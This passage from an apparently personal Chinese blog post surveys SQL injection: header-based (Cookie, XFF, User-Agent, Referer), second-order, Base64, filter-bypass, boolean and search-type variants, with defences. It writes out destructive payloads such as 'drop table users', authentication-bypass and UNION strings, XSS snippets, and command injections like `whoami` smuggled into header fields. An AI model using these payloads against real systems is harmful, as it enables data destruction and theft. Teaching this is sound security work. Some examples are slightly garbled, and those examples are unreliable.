<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: &lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>命令执行:将系统命令注入Cookie,当Web应用读取Cookie时执行命令</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: ;id;`ls`</span><br></pre></td></tr></table></figure>

<p>综上,Cookie 注入就是攻击者通过对Cookie数据的利用,来执行SQL注入、XSS或命令执行等攻击。</p>
<p>主要防范方案是:</p>
<ul>
<li>对Cookie数据进行适当的过滤,只允许安全数据</li>
<li>不要直接嵌入Cookie数据到SQL语句或命令中执行</li>
<li>确保Cookie域设置合理,限制Cookie可访问的页面</li>
</ul>
<p>希望能为您提供参考!如仍然有其他疑问,欢迎随时和我交流。</p>
<p>XFF(X-Forwarded-For)头注入是网站安全漏洞之一。</p>
<p>XFF头用于记录请求者的IP地址。</p>
<p>当用户通过代理或负载均衡设备访问Web应用时,真实的客户端IP会记录在XFF头中。</p>
<p>XFF注入发生在:</p>
<ul>
<li><p>Web应用直接将XFF头中的IP地址,拼接在SQL查询语句或命令中执行。</p>
</li>
<li><p>Web应用未对XFF头中的IP地址做严格的验证。</p>
</li>
</ul>
<p>这就可能允许注入SQL命令或代码。</p>
<p>具体攻击方式包括:</p>
<ul>
<li>SQL注入:将包含SQL查询或命令的IP地址写在XFF头中,从而执行SQL操作。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 1.1.1.1&#x27;; drop table users; --</span><br></pre></td></tr></table></figure>

<ul>
<li>命令执行:将IP地址写为命令,从而在Web应用读取XFF头时执行命令。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: ;id;whoami</span><br></pre></td></tr></table></figure>

<ul>
<li>XSS攻击:将包含XSS脚本的IP地址写在XFF头中,执行XSS。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>总的来说,XFF头注入的基本原理是:<br>攻击者在XFF头中写入特制的IP地址,包含SQL命令、系统命令或XSS脚本等,<br> 当Web应用读取XFF头直接使用其内容时被执行。</p>
<p>防范方案主要是:</p>
<ul>
<li>不要直接使用XFF头中的IP地址,需要做严格的验证和清洗</li>
<li>使用参数化查询,避免在SQL语句中直接使用头信息</li>
<li>过滤特殊字符,只允许安全的数据进入Web应用</li>
</ul>
<p>希望能为您提供参考!如还有其他疑问,欢迎随时和我交流。</p>
<p>UA注入(User-Agent注入)是网站安全漏洞之一。</p>
<p>User-Agent头记录用户使用的浏览器及操作系统相关信息。</p>
<p>UA注入发生在:</p>
<ul>
<li><p>Web应用直接将User-Agent头中的信息,插入SQL查询语句或命令中执行。</p>
</li>
<li><p>Web应用未对User-Agent头信息做足够的验证。</p>
</li>
</ul>
<p>这就可能允许注入恶意代码。</p>
<p>具体攻击方式包括:</p>
<ul>
<li>SQL注入:在User-Agent头中写入SQL语句,从而执行。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US;   </span><br><span class="line">rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6&#x27;; drop table users; --</span><br></pre></td></tr></table></figure>

<ul>
<li>命令执行:写入系统命令 注入User-Agent头,在Web应用读取时执行。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows; U; ;)`whoami`</span><br></pre></td></tr></table></figure>

<ul>
<li>XSS攻击:写入XSS脚本到User-Agent头中执行。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>综上,UA注入的基本原理是:</p>
<p>攻击者在User-Agent头中写入恶意代码,包含SQL语句、系统命令或XSS脚本等,<br>当Web应用读取User-Agent头直接使用其内容时被执行。</p>
<p>防范方法主要有:</p>
<ul>
<li>不要直接使用User-Agent头内容,需要严格验证和过滤特殊字符</li>
<li>使用参数化查询,避免在SQL语句中直接使用头信息</li>
<li>有效的输入过滤,只允许安全的数据进入Web应用</li>
</ul>
<p>希望能为您提供参考!如还有其他疑问,欢迎随时和我交流。</p>
<p>Referer注入是网站安全漏洞之一。</p>
<p>Referer头记录了此次 HTTP 请求的最后一个网页访问资源。</p>
<p>Referer注入发生在:</p>
<ul>
<li><p>Web应用直接将Referer头中的URL,插入SQL查询语句或命令中执行。</p>
</li>
<li><p>Web应用未对Referer头做足够的验证。</p>
</li>
</ul>
<p>这就可能允许注入恶意代码。</p>
<p>具体攻击方式包括:</p>
<ul>
<li>SQL注入:在Referer头中写入包含SQL语句的链接,网页访问时被执行。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://example.com/login.php?username=test&#x27;; drop table users; -- </span><br></pre></td></tr></table></figure>

<ul>
<li>命令执行:写入包含系统命令的URL 注入Referer头,在Web应用读取时执行。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://example.com/`whoami`</span><br></pre></td></tr></table></figure>

<ul>
<li>XSS攻击:写入包含XSS脚本的URL,注入Referer头执行XSS。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://example.com/&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>综上,Referer注入的基本原理是:</p>
<p>攻击者在Referer头中写入恶意代码,包含SQL语句、系统命令或XSS脚本等,<br>当Web应用读取Referer头直接使用其内容时被执行。</p>
<p>防范方法主要有:</p>
<ul>
<li>不要直接使用Referer头内容,需要严格验证和过滤特殊字符</li>
<li>使用参数化查询,避免在SQL语句中直接使用头信息  </li>
<li>有效的输入过滤,只允许安全的数据进入Web应用</li>
</ul>
<p>希望能为您提供参考!如还有其他疑问,欢迎随时和我交流。</p>
<p>二次注入(Second-order injection)是一种Web应用安全漏洞。</p>
<p>区别于一次性注入,它需要两次或多次请求才能完成注入攻击。</p>
<p>主要利用的是:</p>
<ol>
<li><p>Web应用在第一次请求中过滤了用户输入的参数,但是记录了这些参数。</p>
</li>
<li><p>在第二次请求中使用了第一次请求记录的参数,但缺乏进一步过滤,导致注入攻击。</p>
</li>
</ol>
<p>典型攻击方式为:</p>
<ul>
<li>用户名和密码的验证:</li>
</ul>
<p>第一次请求时输入正常用户名和密码,Web应用将用户名记录到Session或Cookie中。</p>
<p>第二次请求时,Web应用从Session读取用户输入的用户名,而不再进行过滤,从而形成SQL注入漏洞。</p>
<ul>
<li>评论内容的保存:</li>
</ul>
<p>第一次请求时输入正常的评论内容。</p>
<p>第二次请求中,Web应用从数据库读取评论内容,而未对内容进行过滤,导致XSS攻击。</p>
<ul>
<li>购物车内容保存:</li>
</ul>
<p>网页将购物车中的商品列表保存到Session或数据库。</p>
<p>第二次请求时,Web应用读取Session或数据库的内容,将商品列表插入SQL语句中,形成SQL注入。</p>
<p>总的来说,二次注入利用的是:</p>
<ul>
<li><p>Web应用在第一时刻过滤了用户输入。</p>
</li>
<li><p>但在第二次读取用户输入时,又使用了不安全的方法(如直接拼接SQL语句),缺乏进一步过滤,从而产生安全风险。</p>
</li>
</ul>
<p>防范方式主要有:</p>
<ul>
<li>在每一次读取用户输入时,都要进行适当的过滤和转义。</li>
<li>使用参数化查询以避免SQL注入。</li>
<li>始终检验和过滤输出,以防止XSS攻击。</li>
</ul>
<p>希望可以为您提供参考!如还有其他疑问,欢迎随时和我交流。</p>
<p>Base64注入是一种利用Base64编码绕过输入过滤进行注入攻击的技巧。</p>
<p>通常情况下,用户输入的数据会被过滤特殊字符来防止SQL注入、XSS攻击等。</p>
<p>而Base64编码就可以用于绕过这种过滤。</p>
<p>Base64编码会将数据转换成ASCII字符组,看起来就像正常的数据。</p>
<p>具体做法是:</p>
<ol>
<li><p>将SQL语句或XSS脚本等代码经Base64编码;</p>
</li>
<li><p>把编码后的字符串作为参数提交;</p>
</li>
<li><p>Web应用在处理时会先将Base64字符串解码,再执行;</p>
</li>
<li><p>从而实现注入攻击。</p>
</li>
</ol>
<p>例如:</p>
<p>SQL语句:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;; drop table users;--</span></span><br></pre></td></tr></table></figure>

<p>Base64编码后:</p>
<p>YCcgZHJvcCB0YWJsZSB1c2VyczstLQ&#x3D;&#x3D;</p>
<p>提交参数:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&amp;username=YCcgZHJvcCB0YWJsZSB1c2VyczstLQ==</span><br></pre></td></tr></table></figure>

<p>Web应用处理时:</p>
<ol>
<li>先对username的值 YCcgZHJvcCB0YWJsZSB1c2VyczstLQ&#x3D;&#x3D; 进行Base64解码</li>
<li>得到’; drop table users;–</li>
<li>然后将其嵌入SQL语句中执行</li>
</ol>
<p>从而实现了SQL注入攻击。</p>
<p>综上,Base64注入利用Base64编码绕过过滤,达到执行注入攻击的目的。</p>
<p>防范方式主要是:</p>
<ul>
<li>对所有用户输入进行双重过滤,包括Base64解码后的内容再做过滤</li>
<li>避免直接使用用户输入,使用参数化查询等安全 METHOD</li>
</ul>
<p>希望可以为您提供参考!如还有其他疑问,欢迎随时和我交流。</p>
<h3 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h3><p>以下是SQL注入的四种常用绕过方法:</p>
<p>1.大小写绕过注入:利用SQL的大小写不敏感特性,将SQL关键字如select、from等改写为其他大小写绕过过滤。</p>
<p>2.双写绕过注入:将SQL关键字如select写为sselect、ffrom写为ffrom等双写绕过。</p>
<p>3.编码绕过注入:使用URL编码或其他编码方式对SQL关键字进行编码绕过过滤。如encodeURI()函数。</p>
<p>4.内联注释绕过注入:# 或– 注释符绕过。例如</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>#</span><br><span class="line"><span class="keyword">user</span>()# </span><br><span class="line"><span class="keyword">from</span> users <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>使用注释进行SQL拼接绕过过滤。</p>
<h3 id="SQL注入有哪些危害？"><a href="#SQL注入有哪些危害？" class="headerlink" title="SQL注入有哪些危害？"></a>SQL注入有哪些危害？</h3><p>1.获取数据库数据</p>
<p>数据库中存放的用户的隐私信息的泄露，脱取数据库中的数据内容（脱库），可获取网站管理员帐号、密码悄无声息的进行对网站后台操作等。</p>
<p>2.网页篡改</p>
<p>通过操作数据库对特定网页进行篡改，严重影响正常业务进行与受害者信誉。</p>
<p>3.网页挂马</p>
<p>将恶意文件或者木马下载链接写入数据库，修改数据库字段值，进行挂马攻击。</p>
<p>4.篡改数据库数据</p>
<p>攻击数据库服务器，篡改或者添加普通用户或者管理员帐号。</p>
<p>5.获取服务器权限</p>
<p>列取目录、读取、写入shell文件获取webshell，远程控制服务器，安装后门，经由数据库服务器提供的操作系统支持，让攻击者得以修改或控制操作系统。</p>
<p>SQL注入是一种常见的网络安全漏洞，攻击者利用该漏洞在应用程序的SQL查询中插入恶意的SQL代码，从而执行未经授权的数据库操作。SQL注入的注入点类型可以根据注入发生的位置和方式进行分类。以下是一些常见的SQL注入的注入点类型分类：</p>
<ol>
<li><p>查询字符串注入（Query String Injection）：攻击者通过修改URL中的查询字符串参数，将恶意的SQL代码插入到应用程序的数据库查询中。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/page?id=1; DROP TABLE users;</span><br></pre></td></tr></table></figure>
</li>
<li><p>表单注入（Form Injection）：攻击者通过修改应用程序的表单输入字段，将恶意的SQL代码插入到数据库查询中。这种注入点类型常见于登录表单、搜索表单等。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; -- </span><br></pre></td></tr></table></figure>
</li>
<li><p>HTTP头注入（HTTP Header Injection）：攻击者通过修改HTTP请求头部的一些字段值，将恶意的SQL代码插入到应用程序的数据库查询中。这种注入点类型通常发生在应用程序在处理用户提供的HTTP头部字段时缺乏充分的输入验证和过滤。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0\r\n\r\nSET @var = &#x27;evil code&#x27;;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Cookie注入（Cookie Injection）：攻击者通过修改HTTP请求中的Cookie值，将恶意的SQL代码插入到应用程序的数据库查询中。这种注入点类型常见于未对Cookie进行充分验证和过滤的情况下，将Cookie值直接用于数据库查询。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie: username=&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; --</span><br></pre></td></tr></table></figure>
</li>
<li><p>存储过程注入（Stored Procedure Injection）：攻击者通过修改应用程序调用数据库存储过程的参数，将恶意的SQL代码插入到存储过程中，从而执行未经授权的操作。</p>
</li>
</ol>
<p>这些是常见的SQL注入的注入点类型，但并不是 exhaustive list。重要的是了解这些类型，并采取适当的防御措施，如使用参数化查询、输入验证和过滤、最小权限原则等来防止SQL注入攻击。</p>
<h5 id="数字型SQL注入"><a href="#数字型SQL注入" class="headerlink" title="数字型SQL注入"></a>数字型SQL注入</h5><p>是一种SQL注入攻击技术。攻击者利用网站的输入字段(如搜索框、登录框等)输入特制的SQL语句,从而诱骗数据库执行恶意操作。</p>
<p>数字型SQL注入是通过将数字作为SQL注入条件插入到输入字段中实现的。例如:</p>
<ol>
<li>查询数据表中的某个特定记录:</li>
</ol>
<p>URL 为:<a target="_blank" rel="noopener" href="http://example.com/query?id=1">http://example.com/query?id=1</a></p>
<p>注入为:<a target="_blank" rel="noopener" href="http://example.com/query?id=1">http://example.com/query?id=1</a> or 1&#x3D;1</p>
<p>逼真的注入将具体条件替换为 1&#x3D;1 ,导致返回所有记录。</p>
<ol start="2">
<li>修改数据表中的记录:</li>
</ol>
<p>URL 为:<a target="_blank" rel="noopener" href="http://example.com/update?id=1&name=John">http://example.com/update?id=1&amp;name=John</a></p>
<p>注入为:<a target="_blank" rel="noopener" href="http://example.com/update?id=1">http://example.com/update?id=1</a>; update table set name&#x3D;’hacked’ –</p>
<p>附加的 SQL 语句会更新该表所有记录的 name 字段为 hacked。</p>
<p>3)删除数据表中的记录:</p>
<p>类似地,数字型SQL注入也可以用于删除数据表中的记录。</p>
<p>以上都是数字型SQL注入的基本方式。透过输入精心编写的数字型SQL语句,攻击者就可以获取敏感数据、损坏数据等。</p>
<p>数字型SQL注入主要利用普遍存在的SQL语句 flawed input进行,因此需要对网站代码及数据库进行安全配置来防范这类攻击。</p>
<h5 id="布尔型SQL注入"><a href="#布尔型SQL注入" class="headerlink" title="布尔型SQL注入"></a>布尔型SQL注入</h5><p>是一种SQL注入攻击方法。它通过插入特殊构造的SQL语句,观察数据库行为(返回TRUE或FALSE),来获取数据库信息。</p>
<p>这种注入的过程如下:</p>
<ol>
<li><p>攻击者首先构造一个能返回TRUE&#x2F;FALSE的SQL条件语句。</p>
</li>
<li><p>然后将这个语句插入表单输入框提交。</p>
</li>
<li><p>根据数据库返回的结果(页面异常&#x2F;正常),攻击者判断条件语句返回的结果是TRUE还是FALSE。</p>
</li>
<li><p>通过不断重复上述步骤,逐渐消解SQL语句,掌握数据库结构信息和数据内容。</p>
</li>
</ol>
<p>举个例子:</p>
<p>一个网站的登录表单如下:</p>
<p><code>&lt;form&gt;  Username: &lt;input type=&quot;text&quot; name=&quot;user&quot;&gt; Password: &lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;</code></p>
</form>

<p>一般的登录请求为:</p>
<p><code>http://example.com/login.php?user=john&amp;pwd=12345</code></p>
<p>此时攻击者可以注入以下语句测试:</p>
<p><code>http://example.com/login.php?user=admin&#39; or 1=1 --&amp;pwd=12345</code></p>
<p>如果页面正常显示(可登录),则表示返回TRUE。<br>反之,如果显示异常(无法登录),则表示返回FALSE。</p>
<p>通过不断重复上述方式进行注入,逐步测试数据库的结构和数据内容,最终达到攻击目的。</p>
<p>总的来说,布尔型SQL注入通过返回TRUE或FALSE来探测数据库信息,隐蔽性强,难以防范,属于常见的SQL注入攻击方法之一。</p>
<h5 id="字符型SQL"><a href="#字符型SQL" class="headerlink" title="字符型SQL"></a>字符型SQL</h5><p>注入是一种SQL注入攻击方法。它通过插入包含特殊字符的SQL语句,来获取数据库信息。</p>
<p>这种注入的过程如下:</p>
<ol>
<li><p>攻击者构造包含特殊字符的SQL语句,如单引号’、转义符\等。</p>
</li>
<li><p>将这个语句插入表单输入框提交。</p>
</li>
<li><p>根据数据库返回的信息,攻击者解析结果,逐渐获取数据库数据。</p>
</li>
</ol>
<p>例如:</p>
<p>一个网站有一个用户注册表单,如下:</p>
<p>&#96;<form><br>Username: <input type="text" name="user"><br>Password: <input type="password" name="pwd"></p>
</form>`

<p>正常的注册请求为:</p>
<p><code>http://example.com/register.php?user=john&amp;pwd=12345</code></p>
<p>此时攻击者可以注入:</p>
<p><code>http://example.com/register.php?user=john&#39; 或者 user=john&quot;</code>   </p>
<p>如果数据库返回的信息包含特殊字符,则表示注入成功。</p>
<p>通过不断重复上述过程,修改注入payload并观察返回结果,攻击者最终能获得数据库中表名、字段名、记录数等敏感信息。</p>
<p>总的来说,字符型SQL注入通过注入特殊字符并观察数据库返回结果,来获取数据库信息。它比布尔型SQL注入更直接,能迅速掌握数据库结构,因此也属于常见的SQL注入攻击方法。</p>
<p>防范字符型SQL注入主要通过对用户输入做合法性校验、添加转义字符、prepared statements等方法。</p>
<h5 id="搜索型SQL"><a href="#搜索型SQL" class="headerlink" title="搜索型SQL"></a>搜索型SQL</h5><p>注入是一种通过网站搜索功能来执行SQL注入攻击的方式。</p>
<p>这种注入的核心思路是:</p>
<ol>
<li><p>攻击者先构造包含SQL关键字或特殊字符的搜索词。</p>
</li>
<li><p>将这个搜索词输入搜索框,提交到网站后台。</p>
</li>
<li><p>如果搜索结果数量超出预期,表明注入成功。</p>
</li>
</ol>
<p>通过不断完善搜索词,观察结果变化,攻击者逐渐掌握数据库结构和内容。</p>
<p>举个例子:</p>
<p>一个网站有个搜索框,可以搜索文章标题。</p>
<p>正常搜索词为:</p>
<p><code>http://example.com/search.php?q=sql</code></p>
<p>此时攻击者可以搜索: </p>
<p><code>http://example.com/search.php?q=sql&#39; or 1=1 --</code></p>
<p>如果搜索结果显示所有文章,则表明注入成功。</p>
<p>攻击者还可以继续搜索:</p>
<p><code>http://example.com/search.php?q=sql&#39; union select table_name from tables--</code></p>
<p>如果返回一个’表名’,则说明成功获取到一个表名。</p>
<p>通过不断完善这种搜索词,可能获得所有表名、字段名乃至数据记录。</p>
<p>总的来说,搜索型SQL注入通过网站搜索功能作为注入载体,通过构造特殊搜索词,执行SQL语句来获取数据库信息。它的易用性高,隐蔽性好,属于常见的SQL注入方式之一。</p>
<p>防范搜索型SQL注入的关键在于:</p>
<ol>
<li>对用户搜索词进行严格过滤,限定只允许合法字符</li>
<li>对搜索结果数量做限制,超出范围则标识可能存在注入</li>
<li>使用 prepared statements 等技术隔离SQL命令和用户输入</li>
</ol>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://localhost:4000">Roy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://localhost:4000/2023/11/30/12.SQl%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/">http://localhost:4000/2023/11/30/12.SQl%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://localhost:4000" target="_blank"></a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SQL/">SQL</a><a class="post-meta__tags" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%B8%97%E9%80%8F/">数据库 - 渗透</a></div><div class="post_share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/11/30/13.SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" title="SQL报错注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SQL报错注入</div></div></a></div><div class="next-post pull-right"><a href="/2023/11/30/3.SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/" title="SQL注入绕过"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SQL注入绕过</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/11/30/12.SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/" title="SQL注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-30</div><div class="title">SQL注入</div></div></a></div><div><a href="/2023/11/30/1.SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" title="SQL注入学习"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-30</div><div class="title">SQL注入学习</div></div></a></div><div><a href="/2023/11/30/13.SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" title="SQL报错注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-30</div><div class="title">SQL报错注入</div></div></a></div><div><a href="/2023/11/30/3.SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/" title="SQL注入绕过"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-30</div><div class="title">SQL注入绕过</div></div></a></div><div><a href="/2023/11/30/2.SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/" title="SQL注入绕过方式总结"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-30</div><div class="title">SQL注入绕过方式总结</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Roy</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Azure089/"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎光临Roy的小站😊！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">一、原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.1.</span> <span class="toc-text">字符注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.2.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.3.</span> <span class="toc-text">布尔注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.4.</span> <span class="toc-text">联合查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Payload"><span class="toc-number">1.0.4.1.</span> <span class="toc-text">Payload</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.0.5.</span> <span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Payload-1"><span class="toc-number">1.0.5.1.</span> <span class="toc-text">Payload</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.6.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Payload-2"><span class="toc-number">1.0.6.1.</span> <span class="toc-text">Payload</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2"><span class="toc-number">1.0.7.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1"><span class="toc-number">1.0.8.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-2"><span class="toc-number">1.0.9.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3"><span class="toc-number">1.0.10.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-4"><span class="toc-number">1.0.11.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link"><span class="toc-number">1.0.12.</span> <span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%A3%80%E6%B5%8B"><span class="toc-number">1.1.</span> <span class="toc-text">二、检测</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E6%B3%A8%E5%85%A5-1"><span class="toc-number">1.1.1.</span> <span class="toc-text">字符注入:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5-1"><span class="toc-number">1.1.2.</span> <span class="toc-text">联合查询注入:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.3.</span> <span class="toc-text">布尔型注入:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.4.</span> <span class="toc-text">错误注入:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8-1"><span class="toc-number">1.1.5.</span> <span class="toc-text">时间盲注:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8A%A5%E8%A1%A8%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.6.</span> <span class="toc-text">报表注入:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.7.</span> <span class="toc-text">函数注入:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span 